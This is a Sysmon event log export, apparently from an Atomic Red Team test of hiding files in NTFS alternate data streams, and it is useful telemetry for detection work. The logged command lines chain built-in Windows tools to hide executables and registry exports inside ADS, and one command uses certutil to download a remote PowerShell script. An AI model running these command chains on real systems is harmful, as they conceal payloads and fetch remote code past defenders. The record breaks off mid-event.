Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 10:16:53.941,,,,,,,,,11,9450,,,,C:\Windows\system32\certutil.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 10:16:53.941

ProcessGuid: {fda94052-4b15-658d-6702-000000000b00}

ProcessId: 8312

Image: C:\Windows\system32\certutil.exe

TargetFilename: C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\test[1].ps1

CreationUtcTime: 2023-12-28 10:16:53.941

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-4b15-658d-6702-000000000b00},7044,8312,,,,,,"
      ",-,,,,,,2023-12-28T10:16:53.9436731Z,C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\test[1].ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:53.941,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:53.9436731Z""/>
      <EventRecordID>9450</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:53.941</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b15-658d-6702-000000000b00}</Data>
      <Data Name=""ProcessId"">8312</Data>
      <Data Name=""Image"">C:\Windows\system32\certutil.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\test[1].ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 10:16:53.941</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 10:16:53.941

ProcessGuid: {fda94052-4b15-658d-6702-000000000b00}

ProcessId: 8312

Image: C:\Windows\system32\certutil.exe

TargetFilename: C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\test[1].ps1

CreationUtcTime: 2023-12-28 10:16:53.941

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,,1,9449,,10.0.22621.1992 (WinBuild.160101.0800),"MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.167

ProcessGuid: {fda94052-4b15-658d-6702-000000000b00}

ProcessId: 8312

Image: C:\Windows\System32\certutil.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: CertUtil.exe

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CertUtil.exe

CommandLine: certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,CertUtil.exe,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b15-658d-6702-000000000b00},7044,8312,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:53.1791342Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:53.167,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:53.1791342Z""/>
      <EventRecordID>9449</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:53.167</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b15-658d-6702-000000000b00}</Data>
      <Data Name=""ProcessId"">8312</Data>
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1992 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">CertUtil.exe</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      <Data Name=""CommandLine"">certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.167

ProcessGuid: {fda94052-4b15-658d-6702-000000000b00}

ProcessId: 8312

Image: C:\Windows\System32\certutil.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: CertUtil.exe

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CertUtil.exe

CommandLine: certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,extrac32  c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® CAB File Extract Utility,,,,,,,1,9448,,5.00 (WinBuild.160101.0800),"MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27",C:\Windows\System32\extrac32.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.045

ProcessGuid: {fda94052-4b15-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\extrac32.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: Microsoft® CAB File Extract Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: extrac32.exe

CommandLine: extrac32  c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,extrac32.exe,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b15-658d-6602-000000000b00},7044,660,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:53.0477545Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:53.045,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:53.0477545Z""/>
      <EventRecordID>9448</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:53.045</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b15-658d-6602-000000000b00}</Data>
      <Data Name=""ProcessId"">660</Data>
      <Data Name=""Image"">C:\Windows\System32\extrac32.exe</Data>
      <Data Name=""FileVersion"">5.00 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; CAB File Extract Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">extrac32.exe</Data>
      <Data Name=""CommandLine"">extrac32  c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.045

ProcessGuid: {fda94052-4b15-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\extrac32.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: Microsoft&#174; CAB File Extract Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: extrac32.exe

CommandLine: extrac32  c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9447,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.002

ProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ProcessId: 5324

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-4b15-658d-6402-000000000b00},7044,5324,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:53.0037575Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:53.002,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:53.0037575Z""/>
      <EventRecordID>9447</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:53.002</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ProcessId"">5324</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
